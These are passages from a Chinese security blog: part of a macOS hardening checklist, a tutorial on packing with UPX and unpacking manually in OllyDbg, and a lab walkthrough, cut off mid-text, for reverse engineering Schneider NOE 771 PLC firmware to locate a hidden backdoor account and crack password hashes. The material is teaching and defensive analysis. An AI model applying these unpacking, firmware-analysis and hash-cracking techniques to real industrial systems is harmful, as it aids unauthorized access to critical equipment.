AutomaticallyInstallMacOSUpdates\n1\n```\n\n如果启用了自动更新，则返回值应该为1，如上面输出所示。如果该设置不存在，可以通过以下命令来手动设置：\n\n```\nsudo defaults write /Library/Preferences/com.apple.SoftwareUpdate AutomaticallyInstallMacOSUpdates -int 1\n```\n\n<font color=red>***自动更新，修补漏洞***</font> \n\n**(17) Gatekeeper（重要）**\n\nGatekeeper将检查应用程序是否使用有效的Apple证书进行签名。通过以下方式来检查应用程序是否具有签名：\n\n```\nspctl –a /Applications/test.app\n```\n\n如果要将其添加到Gatekeeper，可以使用如下命令：\n\n```\nspctl --add test.app\n```\n\n或者直接执行下面的操作：\n\n右键单击，选择“打开”。\n\n注意：在一些情况下，系统可能仍然会拒绝打开应用程序。这时，我们可以强行启动：\n\n点击“系统偏好设置”，选择“安全和隐私”（Security & Privacy），选择“常规”（General）。然后打开应用程序。\n\n<font color=red>***安装程序时，验证签名，提高安装软件的安全性***</font> \n\n**(18) 执行代码签名机制（重要）**\n\n可以编辑/etc/sysctl.conf，在其中添加以下行：\n\n```\nvm.cs_force_kill=1  # Kill process if invalidated\nvm.cs_force_hard=1  # Fail operation if invalidated\nvm.cs_all_vnodes=1  # Apply on all Vnodes\nvm.cs_enforcement=1 # Globally apply code signing enforcement\n```\n\n注意：此项更改需要禁用系统完整性保护，在加固后请手动启用。在新安装的系统上，sysctl.conf可能不存在，管理员可以创建该文件并重新启动系统。\n\n**(19) 禁用元数据文件创建（重要）**\n\n建议禁止在macOS在远程卷（例如：网络存储、USB存储）上创建临时文件。下面的命令可以阻止此类行为：\n\n```\ndefaults write com.apple.desktopservices DSDontWriteNetworkStores -bool true\ndefaults write com.apple.desktopservices DSDontWriteUSBStores -bool true\n```\n\n<font color=red>***防止入侵者创建一些不好的东西***</font> \n\n**(20) 禁用保存到iCloud（重要）**\n\n以下命令可以阻止macOS将文件直接保存到任何iCloud服务器：\n\n```\nsudo defaults write NSGlobalDomain NSDocumentSaveNewDocumentsToCloud -bool false\n```\n\n<font color=red>***防止对数据构成威胁***</font> \n\n**(21) 禁用诊断（重要）**\n\n要避免向Apple或App Developers发送数据，请禁用以下内容：\n\n在“系统偏好设置”中，选择“安全和隐私”，选择“隐私”（Privacy），选择“诊断和使用”（Diagnostics & Usage）。取消选中“向Apple发送诊断和使用数据”（Send diagnostic & usage data to Apple），取消选中“与应用开发者共享崩溃数据”（Share crash data with app developers）。\n\n<font color=red>***禁止发送数据给开发者，防止数据泄露***</font> \n\n**(22) 禁用Handoff（重要）**\n\nApple Handoff是一项保持工作区同步的功能，但该功能需要向Apple发送数据，建议禁用这一功能。\n\n在“系统首选项”（System Preferences）中，选择“常规”（General），取消选中“允许在此Mac和iCloud设备之间切换”（Allow Handoff between this Mac and your iCloud devices），并将“最近项目”设置为“无”（None）。\n\n<font color=red>***禁止发送无必要的数据***</font> \n\n**(23) FileVault（重要）**\n\n建议启动FileVault，以在设备上启用完整磁盘加密。该功能应该已经默认启用。但是，在安装macOS之后再打开FileVault会更加安全，因为此时的伪随机数生成器会具有更加随机的种子。\n\n点击“系统偏好设置” – “安全和隐私” – “FileVault”，选择“启用FileVault”。\n\n*可选设置：\n\n如果要在休眠时，从内存中删除加密密钥，并从内存中断电，可以使用以下命令：\n\n```\nsudo pmset -a destroyfvkeyonstandby 1 hibernatemode 25\n```\n\n注意：这项操作可能会对用户体验产生影响，因为必须要在每次合盖/开盖后解密磁盘。因此，启动过程最多可能需要10秒钟时间。我们建议对安全性要求较高的计算机设置此选项，其首选设置如下：\n\n```\nsudo pmset -a powernap 0\nsudo pmset -a standby 0\nsudo pmset -a standbydelay 0\nsudo pmset -a autopoweroff 0\n```\n\n<font color=red>***启用完整的数据加密，大大增加安全性***</font> \n\n**(24) 防火墙（重要）**\n\n建议启用具有完整功能的防火墙，并阻止所有传入流量。\n\n点击“系统偏好设置” – “安全和隐私” – “防火墙”，点击“打开防火墙”（Turn on Firewall）。选择“防火墙选项”（Firewall Options），设置“阻止所有传入连接”（Block All Incoming Connections），设置“启用隐身模式”（Enable Stealth Mode）。\n\n<font color=red>***启用防火墙，增强安全性***</font> \n\n**(25) 需要管理员密码（重要）**\n\n建议始终要求在验证管理员密码后才能访问系统设置。\n\n<font color=red>***root权限账号一定要加强管理***</font> \n\n**(26) 屏幕保护程序和解锁（重要）**\n\n建议在不活动时，自动锁定屏幕。\n\n点击“系统偏好设置” – “桌面和屏幕保护程序”（Desktop & Screensaver） – “屏幕保护程序”（Screensaver）。根据需要调整时间范围，我们建议将其设置为5分钟。\n\n点击“系统偏好设置” – “安全和隐私” – “常规”，设置“睡眠或屏幕保护程序开始后立即需要密码”（Require password immediately after sleep or screen saver begins）。\n\n<font color=red>***防止主人离开时，有人不经允许使用***</font> \n\n**(27) 文件扩展名（重要）**\n\n要始终掌握用户正在处理的文件类型，建议开启显示文件扩展名。\n\n打开“访达”（Finder），选择“设置”（Settings） – “高级”（Advanced），选择“显示所有文件扩展名”（Show all filename extensions）。\n\n<font color=red>***显示文件扩展名***</font> \n\n**(28) 阻止Safari打开已知类型文件（重要）**\n\n如果用户使用Safari作为主要的浏览器，建议阻止Safari在下载文件后打开已知文件类型的文件。\n\n打开Safari，选择“首选项”（Preferences），选择“常规”（General），取消“下载后打开安全文件”（Open safe files after downloading）。\n\n<font color=red>***文件不要直接打开，要经过安全性的验证***</font> \n\n**(29) 设置严格的全局Umask（可选）**\n\n严格限制全局Umask默认使用用户将来创建的任何文件或目录的权限。我们可以使用以下命令来调整全局Umask：\n\n```\nsudo launchctl config system umask 027\n```\n\n注意：这可能会破坏依赖于较少限制的umask的其他软件安装。\n\n<font color=red>***控制权限***</font> \n\n**(30) 禁用远程Apple事件（重要）**\n\n建议禁用远程Apple事件服务（默认禁用）。该服务可用于通过网络对另一台Mac上的软件执行操作。因此，它应该始终被禁用。下面的命令可以检查是否启用了远程Apple事件：\n\n```\nsudo systemsetup –getremoteappleevents\n```\n\n应确保输出为：\n\nRemote Apple Events: Off\n\n如果启用，那么可以使用以下命令来禁用：\n\n```\nsudo systemsetup -setremoteappleevents off\n```\n\n<font color=red>***防止通过漏洞远程控制电脑***</font> \n\n**(31) 禁用蓝牙（可选）**\n\n由于此前存在一些针对蓝牙配对和身份检测的攻击方法，因此建议在不需要使用蓝牙时禁用蓝牙。\n\n点击“系统偏好设置” – “蓝牙”（Bluetooth），选择“停用蓝牙”（Deactivate Bluetooth）。\n\n注意：取消激活蓝牙，将会断开蓝牙键盘、蓝牙鼠标或蓝牙耳机等外接设备。\n\n<font color=red>***非必要时禁止使用蓝牙***</font> \n\n**(32) 固件密码（重要）**\n\n要防止单用户模式（Single User Mode）和可引导设备，建议设置足够复杂的固件密码。\n\n在Mac启动时，按下Command + R，将Mac启动到恢复模式（Recovery Mode）。选择“实用程序”（Utilities） – “固件密码实用程序”（Firmware Password Utility），然后设置一个足够复杂的密码。\n\n注意：忘记此密码，可能会导致Mac完全不可用，并阻止计算机起动因此，存储该密码的密码管理器是一个有效的解决方案。此外，无论MacBook的实际键盘布局如何，当尝试访问固件安全组件时，将始终映射英语的默认设置。\n\n<font color=red>***固件密码会大大增加安全性***</font> \n\n**(33) Setuid和Setgid（可选）**\n\n改变二进制文件的Setuid位，是比较重要的一个设置。这可能会影响这些二进制文件的功能，但管理员始终可以撤销这些步骤。使用以下命令，可以获取所有SUID二进制文件的列表：\n\n```\nsudo find / -perm -04000 -ls\nsudo find / -perm -02000 –ls\n```\n\n在这里，过滤掉我们认为“代码质量较差”或通常不信任的应用程序（例如：鼠标外接设备驱动程序）。以下命令可以取消设置文件和目录的描述权限：\n\n```\nchmod u-s #file\nchmod g-s #file\n```\n\n**(34) 禁用核心转储（重要）**\n\n要限制内核信息泄露，请禁用核心转储功能。可以编辑/etc/sysctl.conf中的以下行：\n\n```\nkern.coredump=0\n```\n\n注意：此项更改需要禁用系统完整性保护，在加固后请手动启用。在新安装的系统上，sysctl.conf可能不存在，管理员可以创建该文件并重新启动系统。\n\n由于Kerneldumps可以帮助进行调试，因此可以暂时启用：\n\n```\nsudo sysctl -w kern.coredump=1\n```\n\n<font color=red>***核心位置不应该随意开启权限，防止内核信息泄露***</font> \n\n**(35) 禁用USB/蓝牙和其他大容量存储设备（可选）**\n\n在某些情况下，需要禁用将任何大容量存储插入系统。这一点可以通过删除KEXT驱动程序或使用企业级MDM工具来实现。\n\n要完全禁用USB大容量存储设备，可以删除/System/Library/Extensions中的KEXT驱动程序IOUSBMassStorageClass.kext（必须禁用SIP）。也可以通过删除前面所提到的文件夹中的IOBlueToothFamily来完全禁用蓝牙。删除KEXT驱动程序后，需要在目录上执行以下命令，以重建kernelcache：\n\n```\ntouch /System/Library/Extensions\n```\n\n注意：由于无法插入大容量存储设备，可能会影响MacBook的可用性。但是，USB键盘仍然有效。\n\n此外，一些商业软件（例如：https://www.endpointprotector.com/products/endpoint-protector）可以执行类似的端口阻止，但我们还没有对其进行过任何测试。\n\n<font color=red>***必要时，防止大容量的存储设备***</font> \n\n**(36) 高级防火墙（可选）**\n\n建议管理员更加准确地监控应用了就溜。软件防火墙可以为不同位置和不同网络生成自己的规则集。我们推荐一个更高级的防火墙，例如“Little Snitch”、“Radio Silence”和“Handoff”，这些都是完全成熟的本地防火墙（收费）。如果管理员希望使用免费的防火墙，可以查看精简版的“Murus”。\n\n**·** https://www.obdev.at/products/littlesnitch/index-de.html\n\n**·** https://www.oneperiodic.com/products/handsoff/\n\n**·** https://radiosilenceapp.com/\n\n**·** http://www.murusfirewall.com/\n\n<font color=red>***使用高级防火墙，进一步提高安全性***</font> \n\n**(37) 禁用LAN唤醒（重要）**\n\n选择“系统偏好设置” – “节能”（Energy Saver），取消“网络访问唤醒”（Wake for network access）。\n\n<font color=red>***防止网络唤醒，防止恶意唤醒***</font> \n\n**(38) 禁用Apple文件协议AFP（重要）**\n\n这一协议相当于SMB协议，在macOS 10.11上默认被禁用。管理员可以在以下位置进行验证：\n\n选择“系统偏好设置” – “共享”（Sharing），选择“文件共享”（File Sharing） – “选项”（Options），取消设置“使用AFP共享文件和文件夹”（Share Files and folders using AFP）。\n\n注意：也可以通过命令行实现禁用：\n\n```\nsudo launchctl unload -w /System/Library/LaunchAgents/AppleFileServer.plist\n```\n\n<font color=red>***减少使用共享性的功能，有信息泄露的风险***</font> \n\n**(39) 禁用不必要的服务（可选）**\n\n管理员可以使用以下命令，禁用不必要的服务：\n\n```\nsudo launchctl unload -w /System/Library/LaunchAgents/<Service\n```\n\n注意：这可能会破坏系统的原有功能。要重新加载这些服务，只需将上述命令中的“unload”替换为“load”。\n\n我们在本文的最后，补充了一个可能是不必要服务的清单。\n\n更多服务（Plistfiles）可以在以下目录中找到：\n\n```\n/System/Library/LaunchDaemons\n/System/Library/LaunchAgents\n/Library/LaunchDaemons\n/Library/LaunchAgents\n/Users//Library/LaunchDaemons\n/Users//Library/LaunchAgents\n```\n\n**(40) 禁用共享（重要）**\n\n默认情况下，会禁用共享。管理员可以在这里进行验证：\n\n点击“系统偏好设置” – “共享”，取消其中所有不需要的选项。\n\n<font color=red>***禁止共享***</font> \n\n**(41) 通过NTP启用网络时间同步（重要）**\n\n系统时钟对于日志文件来说非常重要。要确保时钟始终正确，并且未被损坏，可以使用以下命令：\n\n```\nsudo systemsetup -setnetworktimeserver \"time.euro.apple.com\"\nsudo systemsetup -setusingnetworktime on\necho \"restrict default ignore\" >> /etc/ntp.conf\n```\n\n<font color=red>***保证时钟同步争取，避免恶意病毒利用更改时间进行攻击***</font> \n\n**(42) 计算机名/主机名（重要）**\n\n建议平布主机名称，因为其中包含用户名和当前操作系统信息（MacBook → Mac OS）。因此，可以使用以下命令来更改通过网络显示的名称：\n\n```\nsudo scutil --set ComputerName ExampleName\nsudo scutil --set LocalHostName ExampleName\n```\n\n<font color=red>***不要在名字内透露出系统的信息***</font> \n\n**(43) 限制广告追踪（重要）**\n\n要限制设备的追踪，请禁用以下内容：\n\n点击“系统偏好设置” – “安全和隐私” – “隐私” – “广告”（Advertising），选中“限制广告追踪”（Limit Ad Tracking）。\n\n<font color=red>***限制广告获取隐私信息***</font> \n\n**(44) 追踪服务（重要）**\n\n建议禁用追踪服务。如果用户决定使用追踪服务，则可以仅禁用Spotlight建议。\n\n点击“系统偏好设置” – “安全和隐私” – “隐私” – “位置服务”（Location Services），选择“系统服务”（System Services） – 详细信息（Details），取消选中“Spotlight建议”（Spotlight Suggestions）。\n\n<font color=red>***不要轻易打开位置信息，存在被追踪的风险***</font> \n\n**附录：建议禁用的服务清单**\n\n下面列出了服务文件以及建议禁用的相应功能。如果没有特殊需要，不建议启用下面的服务。\n\n```\ncom.apple.AppleFileServer.plist  AFP\nftp.plist  FTP\norg.apache.httpd.plist  HTTP Server\nepcc.plist       Remote Apple Events\ncom.apple.xgridagentd.plist       Xgrid\ncom.apple.xgridcontrollerd.plist        Xgrid\ncom.apple.InternetSharing.plist  Iternet Sharing\ncom.apple.dashboard.advisory.fetch.plist  Dashboard Auto-Update\ncom.apple.UserNotificationCenter.plist     User notifications\ncom.apple.RemoteDesktop.PrivilegeProxy.plist       ARD\ncom.apple.RemoteDesktop.plist        ARD\ncom.apple.IIDCAssistant.plist      iSight\ncom.apple.blued.plist   Bluetooth\ncom.apple.RemoteUI.plist   Remote Control\ncom.apple.gamed.plist        Game Center\n```\n\n","tags":["Docker"],"categories":["其他"]},{"title":"加壳脱壳初步学习总结与简单实战","url":"/2021/01/25/加壳脱壳/","content":"\n### 概念\n\n在一些计算机软件里有一段专门负责保护软件不被非法修改或反编译的程序。它们一般都是先于程序运行，拿到控制权，然后完成它们保护软件的任务。就像动植物的壳一般都是在身体外面一样理所当然。由于这段程序和自然界的壳在功能上有很多相同的地方，基于命名的规则，大家就把这样的程序称为“壳”。就像计算机病毒和自然界的病毒一样，其实都是命名上的方法罢了。\n\n<!-- more -->\n\n从功能上抽象，软件的壳和自然界中的壳相差无几。无非是保护、隐蔽壳内的东西。而从技术的角度出发，壳是一段执行于原始程序前的代码。原始程序的代码在加壳的过程中可能被压缩、加密等。当加壳后的文件执行时，壳－这段代码先于原始程序运行，他把压缩、加密后的代码还原成原始程序代码，然后再把执行权交还给原始代码。软件的壳分为加密壳、压缩壳等类，目的都是为了隐藏程序真正的OEP（入口点，防止被破解）。\n\n程序员编写好软件后，编译成exe可执行文件。有一些信息需要保护起来、有时需要程序存储空间小一点、黑客给木马等加壳以躲避杀毒软件。实现上述功能的软件称为加壳软件。\n\n软件脱壳，顾名思义，就是对软件加壳的逆操作，把软件上存在的壳去掉。\n\n###  分类\n\n所谓的“壳”就是一种对软件进行保护的加密程序，它可以具体分为三种：\n\n（1）压缩壳\n\n压缩壳的主要目的是压缩应用程序的体积，例如最稳定的UPX可以将一般的应用程序压缩到原体积的30%左右。\n\n压缩壳并不会对被加壳程序本身做任何修改，而是直至将其换成一种更加节省空间的存储方式，其目的大致类似于我们经常使用的RAR或ZIP。经过压缩壳处理过的程序在真正被CPU执行前是会自动解压缩（解密）的。\n\n（2）加密壳\n\n加密壳的主要目的是保护原程序不被破解，一般情况下，经过加密壳处理的应用程序体积会增加，但也有部分加密壳结合了压缩壳的特性，会在加密完成后再进行压缩。\n\n而且一般情况下，加密壳会对原程序进行一定的修改，例如代码乱序、代码混淆等，因此经过加密壳处理的程序即便是提交给CPU去执行，原程序的代码也还是发生了改变。\n\n（3）虚拟机保护壳\n\n虚拟机保护壳是近几年在软件安全领域内流行起来的一种非常强悍的加密保护方案。它的关键技术就在于实现了一个软件版的CPU，被加密的可执行代码已经不再遵守Intel制定的OPCode标准了，而是执行由虚拟机作者本身制定的非公开的、动态的CPU指令编码解码标准，我们通常称之为TextCode。\n\n虚拟机保护壳会将被保护程序的可执行代码重新编码为自己的软件CPU可以识别的格式，并进行存储、加载及模拟执行。因此在任何时候，原程序代码对外界来说都将是一个彻底的黑盒，任何人都很难破解。\n\n###  作用\n\n1.有一些版权信息需要保护起来，不想让别人随便改动，如作者的姓名，即为了保护软件不被破解，通常都是采用加壳来进行保护。\n2.需要把程序搞的小一点，从而方便使用。于是，需要用到一些软件，它们能将exe可执行文件压缩。\n3.在黑客界给木马等软件加壳脱壳以躲避杀毒软件。\n\n###  基本过程\n\n我们以使用频率较高的UPX为例，为大家简述加壳与手动解除UPX壳的过程，以加强各位对于加壳去壳这一过程的理解。\n\n从官网下载UPX程序之后，就可以在命令行中使用它了。它的常见命令有两种，一种是加壳时用“upx.exe 目标程序”，另一种是对已经加壳的程序进行解壳“upx.exe -d 目标程序”。\n\n我们将目标程序设定为之前的helloworld.exe，加壳过程如下所示。\n\n![img](https://tva1.sinaimg.cn/large/006y8mN6ly1g754sgk4mhj30ru0fidl7.jpg) \n\n加壳之后为了确定是否成功，我们使用PEiD来检测加壳后的程序，发现提示了UPX，说明加壳已经成功。\n\n![img](https://tva1.sinaimg.cn/large/006y8mN6ly1g754stas53j30fo08sjua.jpg) \n\n我们将加壳后的Helloworld拖入OllyDbg进行解析，通常情况下有三种脱壳的方法：单独跟踪法、ESP平衡法和一步到ESP法，这里我们为大家演示使用ESP平衡法脱壳的过程。\n\n一般来说，外壳程序首先需要保存原程序的寄存器信息，等外壳程序恢复原程序的ESP寄存器的值，常常就到了OEP位置附近，这就是ESP平衡法的思路。\n\n在我们将加壳程序拖入OD后，我们F8单步走走，同时注意右面寄存器FPU的显示，当有且只有ESP和EIP为红色时，我们就可以用ESP定律了。具体在下图中，我们走了一步，就发现只有ESP与EIP变红了。\n\n \n\n![img](https://tva1.sinaimg.cn/large/006y8mN6ly1g754sz2hq2j31da0k7qe8.jpg) \n\n此时我们在ESP后面的地址右键，选择在数据窗口跟随，这样在下面的内存数据窗口与堆栈窗口都会转移到该地址的位置，在本例中即数据窗口中跟随到0012FFA4这个地址，随后我们右键该地址中数值设置断点→硬件访问→word型。\n\n![image-20190919210937881](https://tva1.sinaimg.cn/large/006y8mN6ly1g754tmpj7cj30v40fwdlx.jpg)\n\n随后我们正常运行程序（F9），此时程序会暂停在我们设置的断点位置。\n\n![image-20190919211112002](https://tva1.sinaimg.cn/large/006y8mN6ly1g754v9p6qrj30t20jeah9.jpg) ![image-20190919211036343](https://tva1.sinaimg.cn/large/006y8mN6ly1g754un7ym2j30qa0e00xy.jpg)\n\n然后我们F8单步走，注意到了jnz位置后不要再按F8了（这是向上跳转的），我们用鼠标点击她的下一行然后按F4，让程序强制转到跳转下面继续运行，到达jmp后我们可以跳转，因为接下来有极大可能是程序的OEP。在jmp跳转后，我们就看到了该helloworld程序的OEP。\n\n ![image-20190919211112002](https://tva1.sinaimg.cn/large/006y8mN6ly1g754wcm78tj30t20jen2n.jpg)\n\n之后我们就可以进行脱壳，但是为了避免脱壳过程受到影响，脱壳之前我们先把断点给清理掉。之后在OEP的程序第一行我们右键选择OD的脱壳调试选项。\n\n![img](https://tva1.sinaimg.cn/large/006y8mN6ly1g754wxdox5j31h50u0tu9.jpg) \n\n最终我们生成tk_helloworld.exe程序，检查后发现程序能够正常运行。将其拖入PEiD中发现信息已经改变，脱壳成功。\n\n![img](https://tva1.sinaimg.cn/large/006y8mN6ly1g754x3sn7fj31lm0u0x6l.jpg) \n\n","tags":["个人总结","加壳脱壳"],"categories":["二进制"]},{"title":"控制器固件逆向分析实践（以施耐德NOE 771为例）","url":"/2021/01/25/控制器固件逆向分析实践/","content":"\n## 【实验要求】\n\n针对施耐德NOE 771固件进行逆向分析，并获取到隐藏在汇编代码中的后门账号。\n\n<!-- more -->\n\n## 【实验目的】\n\n理解固件逆向对于安全工作的意义；熟悉主要的固件逆向工具和方法；掌握IDA Pro进行静态分析的使用方式；掌握Binwalk对文件和固件的一般分析方法；\n\n## 【实验原理】\n\n### 1.固件\n\n在计算机领域中固件（firmware）是一种为设备提供控制、监控、数据操作等功能的微型系统。嵌入式设备就是一些典型的含有固件的设备，BIOS也是固件的一种，同样的我们经常使用的硬盘设备也有其自己的固件。\n\n### 2.VXworks\n\n本次实验的施耐德NOE771固件所使用的底层操作系统为Vxworks 5系列，CPU结构为PowerPC。\nVxWorks操作系统是美国WindRiver公司于1983年设计开发的一种嵌入式实时操作系统（RTOS），它以其良好的可靠性和卓越的实时性被广泛地应用在通信、军事、航空及航天等高精尖技术领域中。甚至连1997年4月在火星表面登陆的火星探测器、2008年5月登陆的凤凰号，和2012年8月登陆的好奇号也都使用到了VxWorks系统。\n\n### 3.固件识别和解压\n\n固件的识别和解压，可以借用一些成熟的工具软件，如：Binwalk、BAT（Binary AnalysisToolkit）等。Binwalk和BAT均为比较流行的固件映像提取和分析工具。Binwalk以MIT License发布，BAT以GPL License发布。它们支持的固件映像解压格式对比表如下：\n\n![img](https://tva1.sinaimg.cn/large/006y8mN6ly1g8f3lb0otwj30n409w4qp.jpg)\n对于常见的嵌入式设备固件可以使用Binwalk或BAT来解压并提取固件文件。对于无法自动解压的固件，可以尝试以下方法分析：使用文件分析工具获得固件映像文件的基本数据类型。\n使用字符串打印工具提取文件中所包含的明码字段，寻找是否有引导装载程序以及操作系统内核的信息。\n使用十六进制转储工具（如hexdump）分析为了对齐固件文件空间分段而放入的连续填充字节，文件系统标识有可能紧跟其后。\n文件系统有可能使用非标准的特征符，如果发现可疑特征符字段，可以替换为标准特征符，再尝试由固件解压工具进行识别。\n\n### 4.固件静态分析\n\n固件静态分析指的是在不对嵌入式系统进行实际运行的情况下，通过对固件文件进行逆向解析，分析固件中各代码的调用关系及代码内容从而发现嵌入式系统可能存在的漏洞及后门或针对已发现的漏洞进行定位的一种技术手段。固件静态分析过程中将会涉及到固件提取、加载地址分析等各种分析技术。\n固件解压之后的分析主要集中在对常见漏洞入口进行针对性的静态分析，包括：密码、默认开启的服务、端口、配置文件等。分析方法如下：\n\n1）尝试提取文件中包含的明码字段是否存在硬编码密码等。\n\n2）发掘固件的关联性，包括分析固件作者、库使用、目录结构、配置文件关键字、定制默认密码等信息。\n\n3）对二进制可执行文件进行反汇编分析，可以借用一些成熟的工具软件，如：IDA Pro、Capstone等。对特定的嵌入式系统（如VxWorks）的登录模块进行反汇编分析，获取其登录密码的哈希算法等信息。\n\n4）如果发现包含密码哈希的文件，可考虑使用John the Ripper或Hash Suite等工具进行暴力破解。前者有版本支持GPU加速（支持CUDA和OpenCL）。使用暴力破解工具可以利用前述步骤中提取的关键字，显著加快运行效率。\n\n### 5.IDA Pro\n\nIDA Pro是应用最广泛的静态反汇编工具，它支持对大量的CPU架构进行逆向分析，包括X86、MIPS、PowerPC及Arm等。\n\n### 6.Capstone\n\nCapstone是一个反汇编框架，它支持多种平台，能够运行在Windows、Mac OS X、Linux、FreeBSD、OpenBSD和Solaris中。Capstone可反汇编ARM、ARM64(ARMv8)、MIPS、PPC和X86架构下的应用。\n\n## 【实验环境】\n\n![image-20191029152459378](https://tva1.sinaimg.cn/large/006y8mN6ly1g8f3ndb967j30jy0e040v.jpg)\n\n主机操作系统：Windows、Linux、macOS选其一\n\n主机虚拟机：VMware、VirtualBox、KVM选其一\n\nWindows XP：IDA Pro\n\nKali Linux：Metasploit、Python、Capstone等\n\n## 【实验步骤】\n\n### 1.实验准备\n\n准备好部署有IDA Pro的Windows虚拟机，以及可以使用binwalk、python、十六进制编辑器的环境，例如Kali虚拟机，确保虚机可以方便的进行文件拷贝，也可以使用文件服务器的方式进行共享。准备Vxworks相关文献资料，必要的时候可以直接进行查阅。\n\n### 2.获取固件升级包\n\n在通常情况下，我们通过官网获取到的固件升级包，是一个包含了嵌入式固件的一个升级包。我们需要从该升级包中将真正的固件提取出来进行分析。\n从施耐德官方网站下载固件升级包，从该升级包中提取固件文件。NOE 771的固件文件名为NOE77101.bin。\n\n### 3.识别和解压升级包\n\n提取固件通常的方法是使用Binwalk等二进制分析工具对固件升级包进行自动化分析，待确认升级包类型后在进行解压或其他操作。\nNOE771的固件文件名为NOE77101.bin，首先我们需要使用Binwalk来确认该文件的类型。通过使用Binwalk进行自动分析可以发现，该固件升级包包含了一个zlib压缩的文件。\n\n![截屏2019-10-28下午8.06.00](https://tva1.sinaimg.cn/large/006y8mN6ly1g8f3vpmszhj313u0l3nop.jpg)\n\nBinwalk支持提取zlib压缩的文件，我们可以通过如下命令进行解压\n\n```\nBinwalk-e NOE77101.bin\n```\n\n解压后的文件385将存储在_NOE77101.bin.extracted目录中，并以文件在固件升级包中的起始位置来命名。\n\n下图为解压固件升级包结果。\n\n![截屏2019-10-28下午8.06.53](https://tva1.sinaimg.cn/large/006y8mN6ly1g8f3xj7a19j313u0l3noz.jpg)\n\n### 4.固件提取\n\n通过继续使用Binwalk对解压后的385文件进行分析可见，Binwalk已成功的分析出了固件中的一些路径名等信息，由此可见该文件的确是NOE771所加载的固件文件。\n\n下图查看固件主要文件路径和程序结构以及版本信息。\n\n![截屏2019-10-28下午8.08.18](https://tva1.sinaimg.cn/large/006y8mN6ly1g8f3yz2jcwj313u0l3k8y.jpg)\n\n### 5.分析固件内存加载地址\n\n由于嵌入式系统的固件需要加载到内存中的特定位置进行运行，这个特定的位置就叫做固件加载地址（base address）。\n嵌入式系统的固件内的一些绝对地址调用（例如字符串）均是基于固件加载地址所计算出的内存地址，而不是固件文件中的偏移量地址。例如某函数调用了内存位置为0x30000的字符指针，且我们的固件加载地址为0x10000，那么该字符串在固件文件中的实际位置就是“内存位置”-“固件加载地址”，也就是0x20000。\n因此为了使IDA能够正确的对代码进行解析，我们需要分析出固件的加载地址，否则所有涉及到绝对地址调用的代码解析都将是错误的。\n\n某些固件会采用一些封装，比较典型的封装方法是使用ELF封装。通过封装后的ELF文件头部有特定的数据位记录了该固件的加载地址，因此针对该情况我们可以直接读取ELF文件头，从而直接获取到固件的加载地址。\nELF的全称是Executable and Linkable Format，常被称为ELF格式。通过使用greadelf之类的工具可以轻松的获取ELF文件的信息。\n由于NOE771的固件并没有采用任何封装，因此针对NOE771的固件我们将通过分析固件头部的代码来大致猜测固件的加载地址。\n使用IDA Pro分析嵌入式系统固件的话，首先我们需要确认目标的CPU类型从而选择正确的反汇编引擎。我们可以通过使用Binwalk–A命令来分析。\n![截屏2019-10-28下午8.52.39](https://tva1.sinaimg.cn/large/006y8mN6ly1g8f41ie2mjj313u0l37r9.jpg)\n在得知了目标CPU架构是PowerPC big endian后我们就可以只用IDA加载并进行初步分析。\n\n![image-20191029154240162](https://tva1.sinaimg.cn/large/006y8mN6ly1g8f45s1a5kj31390nz4i1.jpg)\n\n![image-20191029154303971](https://tva1.sinaimg.cn/large/006y8mN6ly1g8f466injcj31390nzqmt.jpg)\n\nIDA Pro进行正确的固件加载默认加载后的IDA界面看起来像是这样的。仅仅分析出了极少数的函数\n\n![image-20191029154424149](https://tva1.sinaimg.cn/large/006y8mN6ly1g8f47kj0g6j31390nz7bl.jpg)\n\n虽然现在我们可以成功反编译，但我们还需要确定固件的代码段基址才能重构符号表\n确定基址的思路是寻找一条相对寻址方式的lis指令。\n\n![5b5021411a2fa](https://tva1.sinaimg.cn/large/006y8mN6ly1g8f4aykgsaj30mb0150mh.jpg)\n\n在IDA中使用ALT+T直接搜lis指令，CTRL+T进行向下(上)搜索，发现在000009F8处的lis指令\n\n![截屏2019-10-28下午9.42.56](https://tva1.sinaimg.cn/large/006y8mN6ly1g8f4c3yajoj31d10lawol.jpg)\n\n观察地址后面的@ha确定基址为0x10000,这也是固件常用基址\n\n对@h和@ha的问题，可以看下图![5b50214142c8e](https://tva1.sinaimg.cn/large/006y8mN6ly1g8f4dmpoz8j30rv0anaam.jpg)\n\n这是powerPC汇编的特性问题，可以参考以下这篇文章：\n\nhttp://blog.chinaunix.net/uid-20663797-id-35772.html\n\n现在我们就需要验证0x10000是否是我们真正的加载地址了。我们需要重新使用IDAPro加载固件文件，并按照下图进行配置。\n\n![ ](https://tva1.sinaimg.cn/large/006y8mN6ly1g8f4i4e78jj31d10lae7l.jpg)\n\n配置正确的内存开始和加载地址完成后我们就可以看到IDA Pro能够正常的分析固件的函数调用关系了。\n\n![image-20191029155711712](https://tva1.sinaimg.cn/large/006y8mN6ly1g8f4kviinoj31390nzahs.jpg)\n\n### 6.利用符号表修复IDA中的函数名\n\n如之前所看到的，IDA虽然成功分析出了函数的调用关系。但是尚无法自动识别出函数的名字，这对我们进行分析造成了很大的阻碍。因此我们需要查看固件是否包含了符号表，如固件包含了符号表那么我们就可以利用符号表中的内容来修复IDA中所显示的函数名。\n符号表（Symbol table）是一种用于语言翻译器中的数据结构，在符号表中，程序源代码中的每个标识符都和它的声明或使用信息绑定在一起，比如其数据类型、作用域以及内存地址。在Vxworks中如果没有符号表我们将不能在shell中执行任何命令，因为Vxworks不知道命令名所对应代码的具体位置。\n由于Vxworks系统的符号表包含了函数及函数名的对应关系，因此我们的第一步就是要找到符号表在固件中的位置。\n之前使用Binwalk分析固件时，已经发现了固件中的符号表位置为0x301E74。\n\n在获取了符号表在固件中的位置后，我们就可以使用16进制编辑器对固件进行查看从而确认Binwalk分析出的地址是否正确。\nVxworks 